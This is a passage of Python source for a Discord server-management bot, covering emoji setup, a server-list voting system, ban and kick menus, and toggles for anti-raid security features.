        if os.path.exists("emojisids\\verify.txt"):
            f = open("emojisids\\verify.txt", "r")
            emojiverifyu = f.read()
            f.close()
        if not os.path.exists("emojisids\\verify.txt"):
            file_path = "emojis\\my_emojiv2.gif"
            MOIE = "verify"
            with open(file_path, 'rb') as file:
                emoji_bytes = file.read()
                file.close()

            emoji_data = {
                'name': MOIE,
                'image': emoji_bytes
            }
            emojimodd = discord.utils.get(guild.emojis, name=MOIE)
            if not emojimodd:
                await guild.create_custom_emoji(**emoji_data)

            emojiverifyu = discord.utils.get(guild.emojis, name=MOIE)
            emoji = emojiverifyu
            f = open(f"emojisids\\verify.txt", "w")
            f.write(f"{emoji}")
            f.close()
    
    if os.path.exists("emojisids\\banlist.txt"):
        f = open("emojisids\\banlist.txt", "r")
        emojibanlistu = f.read()
        f.close()
    if not os.path.exists("emojisids\\banlist.txt"):
        file_path = "emojis\\verify.gif"
        MOIE = "banlist"
        with open(file_path, 'rb') as file:
            emoji_bytes = file.read()
            file.close()

        emoji_data = {
            'name': MOIE,
            'image': emoji_bytes
        }
        emojibanlistu = discord.utils.get(guild.emojis, name=MOIE)
        if not emojibanlistu:
            await guild.create_custom_emoji(**emoji_data)

        emojibanlistu = discord.utils.get(guild.emojis, name=MOIE)
        emoji = emojibanlistu
        f = open(f"emojisids\\banlist.txt", "w")
        f.write(f"{emoji}")
        f.close()
    
    if os.path.exists("emojisids\\rbanlist.txt"):
        f = open("emojisids\\rbanlist.txt", "r")
        emojirbanlistu = f.read()
        f.close()
    if not os.path.exists("emojisids\\rbanlist.txt"):
        file_path = "emojis\\my_emojix.gif"
        MOIE = "rbanlist"
        with open(file_path, 'rb') as file:
            emoji_bytes = file.read()
            file.close()

        emoji_data = {
            'name': MOIE,
            'image': emoji_bytes
        }
        emojirbanlistu = discord.utils.get(guild.emojis, name=MOIE)
        if not emojirbanlistu:
            await guild.create_custom_emoji(**emoji_data)

        emojirbanlistu = discord.utils.get(guild.emojis, name=MOIE)
        emoji = emojirbanlistu
        f = open(f"emojisids\\rbanlist.txt", "w")
        f.write(f"{emoji}")
        f.close()


    if not os.path.exists("emojisids\\setup.txt"):
        filetool.WriteTextFile("emojisids\\setup.txt", "")
        os.system("TASKKILL /F /PID %s" % os.getpid() + "& exit")
    # BOT IS READY ........................
    try:
        antispam.start()
    except:
        pass





    
    try:
        discordbotpanel = discord.utils.get(guild.categories, name="〈✨〉discord-bot-panel")
        if discordbotpanel:
            print(f"{Fore.LIGHTCYAN_EX}Discord-Bot-Panel exists {Fore.WHITE}")
        if not discordbotpanel:
            #await guild.create_category(name="〈✨〉discord-bot-panel")
            print(f"{Fore.LIGHTCYAN_EX}Discord-Bot-Panel Created {Fore.WHITE}")
        discordbotpanel = discord.utils.get(guild.categories, name="〈✨〉discord-bot-panel")

        discordbot = discord.utils.get(guild.channels, name="〈💎〉discord-bot")
        if discordbot:
            print(f"{Fore.LIGHTCYAN_EX}Discord Bot exists {Fore.WHITE}")
        if not discordbot:
            #discordbot = await guild.create_text_channel(name="〈💎〉discord-bot", category=discordbotpanel)
            print(f"{Fore.LIGHTCYAN_EX}Discord Bot exists {Fore.WHITE}")
        #await discordbot.set_permissions(guild.default_role, view_channel=True, send_messages=False)
        discordbot = discord.utils.get(guild.channels, name="〈💎〉discord-bot")

        embed=discord.Embed(title="LogicLab Discord Server", url=f"{discordlink}", description=f"""**__שלום לכולם וברוכים הבאים ל-``LogicLab``! :ocean:__

    • אנחנו קהילה המתמקדת בפיתוח פרויקטים מתקדמים בתחום הטכנולוגיה והאבטחה. :rocket:
    • העיקרון המרכזי שלנו הוא ליצור פתרונות מתקדמים להגנה על הפרטיות והנתונים שלך. :closed_lock_with_key:
    •  __רוב__ פרויקטים שלנו נוצרים ובקוד פתוח שפירסמנו ומבוססים על חדשנות ושיפורים קבועים. :gear:

    • בעזרת מגוון אפשרויות מעניינות, אנחנו מציעים פתרונות ויישומים מתקדמים בתחום האבטחה. :shield:
    • בואו לשפר את החוויה שלך כמשתמש ולהגן על פרטיותך באמצעות הטכנולוגיות המתקדמות שלנו. :computer:
    • אנחנו גאים במוצרים שלנו ומעריכים מאוד את פידבק והמלצות מהלקוחות שלנו וכמו שכבר ניחשתם גם הבוט פותח על ידינו והוא __בחינם__ אז למה אתם מחכים. :bulb:

    __במסגרת הצעות של "פיתוח משותף", אנחנו מזמינים אתכם להציע פרויקטים ורעיונות חדשים, בהם נהנה לעבוד לבנות יחד בכיף. {emojimodu}__

    __``LogicLab`` - חדשנות ופיתוח מתקדם :rocket:__
    **
    """, color=0x00ff89)
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        embed.set_thumbnail(url=f"{servericon}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        #await discordbot.purge()
        #await discordbot.send(embed=embed)
        #await discordbot.send("@everyone")
    except:
        pass
    try:
        unban.start()
    except:
        pass
    f = open("bottoken.txt", "w")
    f.write("Skid")
    f.close()
    time.sleep(1)
    try:
        os.system("attrib +h +s bottoken.txt")
    except:
        pass
    print(Fore.MAGENTA + f"prefix = {bot_prefix}\n{bot.user.name}#{bot.user.discriminator} is ready." + Fore.WHITE)
    botprefix.close()


#Server List ----------------------------------------------------------

class serverlistt(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)


    @discord.ui.button(label="〈🔨〉Create Server", style=discord.ButtonStyle.green, custom_id="Give_view:serverlistt")
    async def serverlistt(self, interaction: discord.Interaction, button: discord.ui.Button):
        roleserverlist = discord.utils.get(guild.roles, id=serverlistrole)
        if roleserverlist in interaction.user.roles:
            await interaction.response.send_modal(serverlisti())
        if roleserverlist not in interaction.user.roles:
            await interaction.response.send_message("You don't have permission", ephemeral=True)

    @discord.ui.button(label="〈🔧〉Delete Server", style=discord.ButtonStyle.red, custom_id="Give_view:serverlistt1")
    async def serverlistt1(self, interaction: discord.Interaction, button: discord.ui.Button):
        roleserverlist = discord.utils.get(guild.roles, id=serverlistrole)
        if roleserverlist in interaction.user.roles:
            await interaction.response.send_modal(serverlistii())
        if roleserverlist not in interaction.user.roles:
            await interaction.response.send_message("You don't have permission", ephemeral=True)






class serverlistii(ui.Modal, title='Delete Server to Server List'):
    cid = ui.TextInput(label='Channel ID')

    async def on_submit(self, interaction: discord.Interaction):
        point = f"systems"
        point2 = f"systems\\serverlist"
        f = open(f"{point2}\\cid.txt", "w", encoding="utf-8")
        f.write(f"{self.cid}")
        f.close()
        f = open(f"{point2}\\cid.txt", "r", encoding="utf-8")
        read = int(f.read())
        f.close()
        os.system(f"del {point2}\\cid.txt")
        channel = discord.utils.get(guild.channels, id=read)
        async for m in channel.history(limit=1):
            last_message_id = m.id
        await channel.delete()
        os.system(f"rmdir /q /s {point}\\serverlist\\{last_message_id}")
        await interaction.response.send_message("The server has been deleted successfully", ephemeral=True)
        

class serverlistie(ui.Modal, title='Edit Server'):
    serverlistname = ui.TextInput(label='Server Name')
    serverlistdes = ui.TextInput(label='Server Description', style=discord.TextStyle.paragraph)
    serverlisticon = ui.TextInput(label='Server Icon')
    serverlink = ui.TextInput(label='Server Link')

    async def on_submit(self, interaction: discord.Interaction):
        p = f"systems\\serverlist\\{interaction.message.id}"
        f = open(f"{p}\\{interaction.message.id}.txt", "r")
        votes = f.read()
        f.close()
        f = open(f"{p}\\serverowner.txt", "r", encoding="utf-8")
        owner = f.read()
        f.close()
        channel = bot.get_channel(interaction.channel.id)
        await channel.edit(name=f"{self.serverlistname}")
        embed=discord.Embed(title=f"{self.serverlistname}", description=f"{self.serverlistdes}", color=discord.Colour.random())
        embed.set_thumbnail(url=f"{self.serverlisticon}")
        if "false" != owner:
            try:
                ownerr = int(owner)
                member = guild.get_member(ownerr)
                embed.add_field(name=f"Server Link:", value=f"[Click Here]({self.serverlink})", inline=True)
                embed.add_field(name=f"Server Owner: ", value=f"``{member.name}#{member.discriminator}``", inline=True)
                embed.add_field(name=f"Votes: ", value=f"``{votes}``", inline=True)
            except:
                embed.add_field(name=f"Server Link", value=f"[Click Here]({self.serverlink})", inline=True)
                embed.add_field(name=f"Votes", value=f"{votes}", inline=True)
        else:
            embed.add_field(name=f"Server Link", value=f"[Click Here]({self.serverlink})", inline=True)
            embed.add_field(name=f"Votes", value=f"{votes}", inline=True)
        await channel.purge()
        message = await channel.send(embed=embed, view=serverlistbuttons())
        p = f"systems\\serverlist\\{message.id}"
        os.system(f"move systems\\serverlist\\{interaction.message.id}\\{interaction.message.id}.txt systems\\serverlist\\{interaction.message.id}\\{message.id}.txt")
        os.system(f"move systems\\serverlist\\{interaction.message.id} systems\\serverlist\\{message.id}")
        g = open(f"{p}\\serverlistname.txt", "w", encoding="utf-8")
        g.write(f"{self.serverlistname}")
        g.close()
        g = open(f"{p}\\serverlistdes.txt", "w", encoding="utf-8")
        g.write(f"{self.serverlistdes}")
        g.close()
        g = open(f"{p}\\serverlisticon.txt", "w", encoding="utf-8")
        g.write(f"{self.serverlisticon}")
        g.close()
        g = open(f"{p}\\serverlink.txt", "w", encoding="utf-8")
        g.write(f"{self.serverlink}")
        g.close()
        await interaction.response.send_message(f'Thanks for your response!', ephemeral=True)

class serverlisti(ui.Modal, title='Add Server to Server List'):
    serverlistname = ui.TextInput(label='Server Name')
    serverlistdes = ui.TextInput(label='Server Description', style=discord.TextStyle.paragraph)
    serverlisticon = ui.TextInput(label='Server Icon')
    serverlink = ui.TextInput(label='Server Link')
    cat = ui.TextInput(label='Category ID')

    async def on_submit(self, interaction: discord.Interaction):
        point = f"systems"
        point2 = f"systems\\serverlist"
        number = 0
        f = open(f"{point2}\\cat.txt", "w", encoding="utf-8")
        f.write(f"{self.cat}")
        f.close()
        f = open(f"{point2}\\cat.txt", "r", encoding="utf-8")
        read = int(f.read())
        f.close()
        os.system(f"del {point2}\\cat.txt")
        embed=discord.Embed(title=f"{self.serverlistname}", description=f"{self.serverlistdes}", color=discord.Colour.random())
        embed.set_thumbnail(url=f"{self.serverlisticon}")
        embed.add_field(name=f"Server Link", value=f"[Click Here]({self.serverlink})", inline=True)
        embed.add_field(name=f"Votes", value=f"0", inline=True)
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        category = discord.utils.get(guild.categories, id=read)
        for channel in category.channels:
            number += 1
        number += 1
        getchannel = await guild.create_text_channel(name=f"{self.serverlistname}", category=category)
        message = await getchannel.send(embed=embed, view=serverlistbuttons())
        p = f"{point}\\serverlist\\{message.id}"
        os.system(f"mkdir {p}")
        f = open(f"{p}\\{message.id}.txt", "w", encoding="utf-8")
        f.write(f"0")
        f.close()
        f = open(f"{p}\\{message.id}.txt", "r", encoding="utf-8")
        servernumber = int(f.read())
        f.close()
        g = open(f"{p}\\serverlistname.txt", "w", encoding="utf-8")
        g.write(f"{self.serverlistname}")
        g.close()
        g = open(f"{p}\\serverlistdes.txt", "w", encoding="utf-8")
        g.write(f"{self.serverlistdes}")
        g.close()
        g = open(f"{p}\\serverlisticon.txt", "w", encoding="utf-8")
        g.write(f"{self.serverlisticon}")
        g.close()
        g = open(f"{p}\\serverlink.txt", "w", encoding="utf-8")
        g.write(f"{self.serverlink}")
        g.close()
        g = open(f"{p}\\channel.txt", "w", encoding="utf-8")
        g.write(f"{getchannel.id}")
        g.close()
        g = open(f"{p}\\serverowner.txt", "w", encoding="utf-8")
        g.write(f"false")
        g.close()
        await interaction.response.send_message(f'Thanks for your response!', ephemeral=True)


class setow(ui.Modal, title='Set up a Server Owner'):
    ownerid = ui.TextInput(label='Owner ID')

    async def on_submit(self, interaction: discord.Interaction):
            mid = f"systems\\serverlist\\{interaction.message.id}"
            serverowner = open(f"{mid}\\serverowner.txt", "w")
            serverowner.write(f"{self.ownerid}")
            serverowner.close()
            try:
                serverowner = open(f"{mid}\\serverowner.txt", "r")
                serverownerr = int(serverowner.read())
                serverowner.close()
                member = guild.get_member(serverownerr)
            except:
                await interaction.response.send_message("The server manager is not configured well", ephemeral=True)
                return
            serverlistname = open(f"{mid}\\serverlistname.txt", "r", encoding="utf-8")
            serverlistnamee = serverlistname.read()
            serverlistname.close()
            serverlistname = open(f"{mid}\\serverlistname.txt", "r", encoding="utf-8")
            serverlistnamee = serverlistname.read()
            serverlistname.close()
            serverlistdes = open(f"{mid}\\serverlistdes.txt", "r", encoding="utf-8")
            serverlistdese = serverlistdes.read()
            serverlistdes.close()
            serverlisticon = open(f"{mid}\\serverlisticon.txt", "r", encoding="utf-8")
            serverlisticone = serverlisticon.read()
            serverlisticon.close()
            serverlink = open(f"{mid}\\serverlink.txt", "r")
            serverlinke = serverlink.read()
            serverlink.close()
            votes = open(f"{mid}\\{interaction.message.id}.txt", "r", encoding="utf-8")
            votese = votes.read()
            votes.close()
            channel = bot.get_channel(interaction.channel.id)
            embed=discord.Embed(title=f"{serverlistnamee}", description=f"{serverlistdese}", color=discord.Colour.random())
            embed.set_thumbnail(url=f"{serverlisticone}")
            embed.add_field(name=f"Server Link:", value=f"[Click Here]({serverlinke})", inline=True)
            embed.add_field(name=f"Server Owner: ", value=f"``{member.name}#{member.discriminator}``", inline=True)
            embed.add_field(name=f"Votes: ", value=f"``{votese}``", inline=True)
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await interaction.message.edit(embed=embed, view=serverlistbuttons())
            await interaction.response.send_message("The server manager has been configured", ephemeral=True)

class serverlistbuttons(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)


    @discord.ui.button(label="Vote", style=discord.ButtonStyle.gray, custom_id="vote_view:vote")
    async def vote(self, interaction: discord.Interaction, button: discord.ui.Button):
        memberr = guild.get_member(interaction.user.id)
        channelid = None
        point = f"systems"
        point2 = f"systems\\serverlist"
        new_position = 0
        if memberr.id in Listserverlistt and memberr.id not in Listserverlist:
            await interaction.response.send_message(f'You have already voted in the last 6 hours. Wait until the 6 hours are up to vote again!', ephemeral=True)
        if memberr.id in Listserverlist and memberr.id not in Listserverlistt:
            await interaction.response.send_message(f'You have already voted in the last 12 hours. Wait until the 12 hours are up to vote again!', ephemeral=True)
        if memberr.id not in Listserverlist and memberr.id not in Listserverlistt:
            await interaction.response.send_message(f'Thanks for your response!', ephemeral=True)
            mid = f"{point}\\serverlist\\{interaction.message.id}"
            serverlistname = open(f"{mid}\\serverlistname.txt", "r", encoding="utf-8")
            serverlistnamee = serverlistname.read()
            serverlistname.close()
            serverlistdes = open(f"{mid}\\serverlistdes.txt", "r", encoding="utf-8")
            serverlistdese = serverlistdes.read()
            serverlistdes.close()
            serverlisticon = open(f"{mid}\\serverlisticon.txt", "r", encoding="utf-8")
            serverlisticone = serverlisticon.read()
            serverlisticon.close()
            serverlink = open(f"{mid}\\serverlink.txt", "r")
            serverlinke = serverlink.read()
            serverlink.close()
            votes = open(f"{mid}\\{interaction.message.id}.txt", "r", encoding="utf-8")
            votese = int(votes.read())
            votes.close()
            f = open(f"{mid}\\serverowner.txt", "r", encoding="utf-8")
            owner = f.read()
            f.close()
            votese += 1
            votese = str(votese)
            embed=discord.Embed(title=f"{serverlistnamee}", description=f"{serverlistdese}", color=discord.Colour.random())
            embed.set_thumbnail(url=f"{serverlisticone}")
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            votes = open(f"{mid}\\{interaction.message.id}.txt", "w", encoding="utf-8")
            votes.write(f"{votese}")
            votes.close()
            if "false" != owner:
                try:
                    ownerr = int(owner)
                    member = guild.get_member(ownerr)
                    embed.add_field(name=f"Server Link:", value=f"[Click Here]({serverlinke})", inline=True)
                    embed.add_field(name=f"Server Owner: ", value=f"``{member.name}#{member.discriminator}``", inline=True)
                    embed.add_field(name=f"Votes: ", value=f"``{votese}``", inline=True)
                except:
                    embed.add_field(name=f"Server Link", value=f"[Click Here]({serverlinke})", inline=True)
                    embed.add_field(name=f"Votes", value=f"{votese}", inline=True)
            else:
                embed.add_field(name=f"Server Link", value=f"[Click Here]({serverlinke})", inline=True)
                embed.add_field(name=f"Votes", value=f"{votese}", inline=True)
            await interaction.message.edit(embed=embed)
            channelvote = bot.get_channel(interaction.channel.id)
            category = discord.utils.get(guild.categories, id=channelvote.category.id)
            for votesss in category.channels:
                if votesss.id != channelvote.id:
                    channelid = votesss.id
                if votesss.id == channelvote.id:
                    mychannelid = votesss.id
                    if not channelid == None:
                        mychannelidd = bot.get_channel(mychannelid)
                        #החדר מתחת
                        async for message in mychannelidd.history(limit=1):
                            last_message = message
                            break
                        #החדר מעל
                        channelwa = bot.get_channel(channelid)
                        async for messages in channelwa.history(limit=1):
                            last_message_id = messages
                            break
                        # החדר מעל
                        try:
                            f = open(f"{point2}\\{last_message_id.id}\\{last_message_id.id}.txt", "r")
                            votelast = f.read()
                            f.close()
                            #החדר מתחת
                            f = open(f"{point2}\\{last_message.id}\\{last_message.id}.txt", "r")
                            votenlast = f.read()
                            f.close()
                            votelast = int(votelast)
                            votenlast = int(votenlast)
                            if votenlast > votelast:
                                current_position = channelwa.position
                                await mychannelidd.edit(position=current_position - 0)
                                nots = "false"
                        except:
                            nots = "true"
            else:
                pass
            if os.path.exists("systems\\serverlist-settings\\TVotes\\true.txt"):
                TRvotesss = int(TRvotes)
                TRvotess = discord.utils.get(guild.roles, id=TRvotesss)
                if TRvotess in memberr.roles:
                    Listserverlistt.append(memberr.id)
                if TRvotess not in memberr.roles:
                    Listserverlist.append(memberr.id)
            if not os.path.exists("systems\\serverlist-settings\\TVotes\\true.txt"):
                print(3)
                Listserverlist.append(memberr.id)
    

    @discord.ui.button(label="〈⚙️〉Edit Server", style=discord.ButtonStyle.blurple, custom_id="Give_view:serverlisttt1")
    async def serverlisttt1(self, interaction: discord.Interaction, button: discord.ui.Button):
        roleserverlist = discord.utils.get(guild.roles, id=serverlistrole)
        if roleserverlist in interaction.user.roles:
            await interaction.response.send_modal(serverlistie())
        if roleserverlist not in interaction.user.roles:
            await interaction.response.send_message("You don't have permission", ephemeral=True)
    

    @discord.ui.button(label="〈👑〉Set Server Owner", style=discord.ButtonStyle.green, custom_id="Give_view:owid")
    async def owid(self, interaction: discord.Interaction, button: discord.ui.Button):
        roleserverlist = discord.utils.get(guild.roles, id=serverlistrole)
        if roleserverlist in interaction.user.roles:
            await interaction.response.send_modal(setow())
        if roleserverlist not in interaction.user.roles:
            await interaction.response.send_message("You don't have permission", ephemeral=True)



@tasks.loop()
async def serverlistf(seconds=4):
    await asyncio.sleep(12 * 3600)
    Listserverlist.clear()

@tasks.loop()
async def serverlistf2(seconds=4):
    await asyncio.sleep(6 * 3600)
    Listserverlistt.clear()

@tasks.loop()
async def serverlistf3(seconds=4):
    await asyncio.sleep(259200)
    if os.path.exists("systems\\serverlist-settings\\AutoDelete.txt"):
        p = f"systems\\serverlist"
        for folder in os.listdir(f"systems\\serverlist"):
            with open(f"{p}\\{folder}\\channel.txt") as file:
                cha = int(file.read())
                file.close()
            with open(f"{p}\\{folder}\\{folder}.txt") as vote:
                votess = int(vote.read())
                vote.close()
            if votess < 6:
                channel = discord.utils.get(guild.channels, id=cha)
                await channel.delete()
                os.system(f"rmdir /q /s {p}\\{folder}")



#Server List ---------------------------------------------------------------------

try:
    class MemberOp(discord.ui.View):
        @discord.ui.select(
            placeholder = "select menu",
            min_values = 1,
            max_values = 1,
            options = [
                discord.SelectOption(
                    label=f"Ban Member",
                    description=f"to permanently ban this member from the server",
                    emoji=f"❌"
                ),
                    discord.SelectOption(
                    label=f"Kick Member",
                    description=f"to permanently kick this member from the server",
                    emoji=f"☢️"
                ),
                    discord.SelectOption(
                    label=f"Add Member to BanList",
                    description=f"Add a member to the list of automatic bans",
                    emoji=f"{emojibanlistu}"
                ),
                    discord.SelectOption(
                    label=f"Remove a Member from BanList",
                    description=f"Remove a member to the list of automatic bans",
                    emoji=f"{emojirbanlistu}"
                ),
            ]
        )
        async def select_callback(self, select, interaction: discord.Interaction,):
            if interaction.values[0] == "Ban Member":
                try:
                    f = open("systems\\moderationoptions\\memberid.txt", "r")
                    member_id = int(f.read())
                    f.close()
                    member = guild.get_member(member_id)
                    os.system("del systems\\moderationoptions\\memberid.txt")
                    await member.ban()
                    await select.response.send_message("The operation was performed successfully", ephemeral=True)
                except:
                    await select.response.send_message("The member is not on the server or the bot does not have permissions", ephemeral=True)
            if interaction.values[0] == "Kick Member":
                try:
                    f = open("systems\\moderationoptions\\memberid.txt", "r")
                    member_id = int(f.read())
                    f.close()
                    member = guild.get_member(member_id)
                    os.system("del systems\\moderationoptions\\memberid.txt")
                    await member.kick()
                    await select.response.send_message("The operation was performed successfully", ephemeral=True)
                except:
                    await select.response.send_message("The member is not on the server or the bot does not have permissions", ephemeral=True)
            if interaction.values[0] == "Add Member to BanList":
                try:
                    member_id = filetool.GetTextFile_encoding(f"systems\\moderationoptions\\memberid.txt", int)
                    filetool.WriteTextFile(f"systems\\Adminpanel\\banlist\\{member_id}", "")
                    await select.response.send_message("The operation was performed successfully", ephemeral=True)
                except:
                    pass
            if interaction.values[0] == "Remove a Member from BanList":
                try:
                    member_id = filetool.GetTextFile_encoding(f"systems\\moderationoptions\\memberid.txt", int)
                    os.system(f"del systems\\Adminpanel\\banlist\\{member_id}")
                    await select.response.send_message("The operation was performed successfully", ephemeral=True)
                except:
                    pass
except:
    pass



class membersec(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)


    @discord.ui.button(label="〈👤〉Add Permissions", style=discord.ButtonStyle.gray, custom_id="addpermissions_view:addpermissions")
    async def addpermissions(self, interaction: discord.Interaction, button: discord.ui.Button):
        securityperm = discord.utils.get(guild.members, id=securitypermid)
        if interaction.user.id == securityperm.id:
            await interaction.response.send_message(f"", ephemeral = True, view=secadd())
        if interaction.user.id != securityperm.id:
            await interaction.response.send_message("You don't have permission to do this!", ephemeral=True)


    @discord.ui.button(label="〈👥〉Remove Permissions", style=discord.ButtonStyle.gray, custom_id="rpermissions_view:rpermissions")
    async def rpermissions(self, interaction: discord.Interaction, button: discord.ui.Button):
        securityperm = discord.utils.get(guild.members, id=securitypermid)
        if int(interaction.user.id) == securityperm.id:
            await interaction.response.send_message(f"", ephemeral = True, view=secdel())
        if int(interaction.user.id) != securityperm.id:
            await interaction.response.send_message("You don't have permission to do this!", ephemeral=True)
        
    
    @discord.ui.button(label="〈👥〉Check Permissions", style=discord.ButtonStyle.gray, custom_id="cpermissions_view:cpermissions")
    async def cpermissions(self, interaction: discord.Interaction, button: discord.ui.Button):
        securityperm = discord.utils.get(guild.members, id=securitypermid)
        if int(interaction.user.id) == securityperm.id:
            await interaction.response.send_modal(checkpermissions())
        if int(interaction.user.id) != securityperm.id:
            await interaction.response.send_message("You don't have permission to do this!", ephemeral=True)
    
    @discord.ui.button(label="〈👥〉Moderation Options", style=discord.ButtonStyle.gray, custom_id="MOI_view:MOI")
    async def MOI(self, interaction: discord.Interaction, button: discord.ui.Button):
        securityperm = discord.utils.get(guild.members, id=securitypermid)
        if int(interaction.user.id) == securityperm.id:
            if os.path.exists("emojisids\\mod.txt"):
                await interaction.response.send_message(f"", ephemeral = True, view=moderationoptions())
            else:
                pass
        if int(interaction.user.id) != securityperm.id:
            await interaction.response.send_message("You don't have permission to do this!", ephemeral=True)
    
    @discord.ui.button(label="〈👥〉Enable/Disable Manager", style=discord.ButtonStyle.gray, custom_id="Punishment_view:Punishment")
    async def Punishment(self, interaction: discord.Interaction, button: discord.ui.Button):
        securityperm = discord.utils.get(guild.members, id=securitypermid)
        if int(interaction.user.id) == securityperm.id:
            await interaction.response.send_message(f"", ephemeral = True, view=EnDi())
        if int(interaction.user.id) != securityperm.id:
            await interaction.response.send_message("You don't have permission to do this!", ephemeral=True)
    


    @discord.ui.button(label="〈👥〉Recovery Manager", style=discord.ButtonStyle.gray, custom_id="Punishment_view:PunishmentR")
    async def PunishmentR(self, interaction: discord.Interaction, button: discord.ui.Button):
        securityperm = discord.utils.get(guild.members, id=securitypermid)
        if int(interaction.user.id) == securityperm.id:
            if not os.path.exists(f"{secupdate}Reconstruction\\Role.txt") or not os.path.exists(f"{secupdate}Reconstruction\\Channel.txt"):
                os.system(f"echo 1 > {secupdate}Reconstruction\\Role.txt")
                os.system(f"echo 1 > {secupdate}Reconstruction\\Channel.txt")
                await interaction.response.send_message(f"System Restore has been activated", ephemeral = True)
                return
            if os.path.exists(f"{secupdate}Reconstruction\\Channel.txt") or os.path.exists(f"{secupdate}Reconstruction\\Role.txt"):
                os.system(f"del {secupdate}Reconstruction\\Channel.txt")
                os.system(f"del {secupdate}Reconstruction\\Role.txt")
                await interaction.response.send_message(f"System Restore is turned off", ephemeral = True)
                return
        if int(interaction.user.id) != securityperm.id:
            await interaction.response.send_message("You don't have permission to do this!", ephemeral=True)



class EnDi(discord.ui.View):
    @discord.ui.select(
        placeholder = "select menu",
        min_values = 1,
        max_values = 1,
        options = [
                discord.SelectOption(
                    label="Add Roles",
                    description="Turning off or turning on the system",
                    emoji="🎁"
                ),
                discord.SelectOption(
                    label="Join Bot",
                    description="Turning off or turning on the system",
                    emoji="🤖"
                ),
                discord.SelectOption(
                    label="Delete Channels",
                    description="Turning off or turning on the system",
                    emoji="⚠️"
                ),
                discord.SelectOption(
                    label="Delete Roles",
                    description="Turning off or turning on the system",
                    emoji="⚠️"
                ),
                discord.SelectOption(
                    label="Kick Members",
                    description="Turning off or turning on the system",
                    emoji="❓"
                ),
                discord.SelectOption(
                    label="Ban Members",
                    description="Turning off or turning on the system",
                    emoji="❔"
                ),
                discord.SelectOption(
                    label="Create Channel",
                    description="Turning off or turning on the system",
                    emoji="🔨"
                ),
                discord.SelectOption(
                    label="Create Role",
                    description="Turning off or turning on the system",
                    emoji="🔨"
                ),
                discord.SelectOption(
                    label="Update Channel",
                    description="Turning off or turning on the system",
                    emoji="🔧"
                ),
                discord.SelectOption(
                    label="Update Role",
                    description="Turning off or turning on the system",
                    emoji="🔧"
                ),
                discord.SelectOption(
                    label="Update Server",
                    description="Turning off or turning on the system",
                    emoji="🔧"
                ),
        ]
    )
    async def select_callback(self, select, interaction):
        if interaction.values[0] == "Add Roles":
            sys = "addrole"

        if interaction.values[0] == "Join Bot":
            sys = "joinbot"

        if interaction.values[0] == "Delete Channels":
            sys = "AntiDeleteChannel"

        if interaction.values[0] == "Delete Roles":
            sys = "AntiDeleterole"

        if interaction.values[0] == "Kick Members":
            sys = "Antikickmembers"

        if interaction.values[0] == "Ban Members":
            sys = "Antibanmembers"

        if interaction.values[0] == "Create Channel":
            sys = "CreateChannel"

        if interaction.values[0] == "Create Role":
            sys = "CreateRole"

        if interaction.values[0] == "Update Channel":
            sys = "UpChannel"

        if interaction.values[0] == "Update Role":
            sys = "UpRole"

        if interaction.values[0] == "Update Server":
            sys = "UpServer"


        if os.path.exists(f"systems\\security\\esecurity\\{sys}" + ".txt"):
            os.system(f"del systems\\security\\esecurity\\{sys}.txt")
            await select.response.send_message(f"Security system {interaction.values[0]} stopped working", ephemeral = True)
        elif not os.path.exists(f"systems\\security\\esecurity\\{sys}" + ".txt"):
            f = open(f"systems\\security\\esecurity\\{sys}.txt", "w")
            f.write("")
            f.close()
            await select.response.send_message(f"Security system {interaction.values[0]} has started to operate", ephemeral = True)

if os.path.exists("emojisids\\mod.txt"):
    class moderationoptions(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=None)


        @discord.ui.button(label=f"Check User information", style=discord.ButtonStyle.gray, custom_id="moderationoptionss_view:moderationoptionssu",  emoji=f"{emojimodu}")
        async def moderationoptionssu(self, interaction: discord.Interaction, button: discord.ui.Button):
            securityperm = discord.utils.get(guild.members, id=securitypermid)
            if interaction.user.id == securityperm.id:
                await interaction.response.send_modal(cui())
            if interaction.user.id != securityperm.id:
                await interaction.response.send_message("You don't have permission to do this!", ephemeral=True)

        
        @discord.ui.button(label=f"Check Role information", style=discord.ButtonStyle.gray, custom_id="moderationoptionss_view:moderationoptionssr",  emoji=f"{emojimodu}")
        async def moderationoptionssr(self, interaction: discord.Interaction, button: discord.ui.Button):
            securityperm = discord.utils.get(guild.members, id=securitypermid)
            if interaction.user.id == securityperm.id:
                await interaction.response.send_modal(cri())
            if interaction.user.id != securityperm.id:
                await interaction.response.send_message("You don't have permission to do this!", ephemeral=True)
        
        @discord.ui.button(label=f"Check Channel information", style=discord.ButtonStyle.gray, custom_id="moderationoptionss_view:moderationoptionssc",  emoji=f"{emojimodu}")
        async def moderationoptionssc(self, interaction: discord.Interaction, button: discord.ui.Button):
            securityperm = discord.utils.get(guild.members, id=securitypermid)
            if interaction.user.id == securityperm.id:
                await interaction.response.send_modal(cci())
            if interaction.user.id != securityperm.id:
                await interaction.response.send_message("You don't have permission to do this!", ephemeral=True)

class cui(ui.Modal, title='Check User Information'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        try:
            member_id = int(self.memberid.value)
            member = guild.get_member(member_id)
            Imagem = discord.utils.get(guild.channels, name="〈💍〉bot-messages")
            image_path = "emojis\\icons8-user-64.png"
            image = Image.open(image_path)
            image_attachment = discord.File(image_path, filename=image_path)
            messageurl = await Imagem.send(file=image_attachment)
            image_link = messageurl.attachments[0].url
            memberroles = f""
            for roles in member.roles:
                memberroles += f"{roles.mention},"
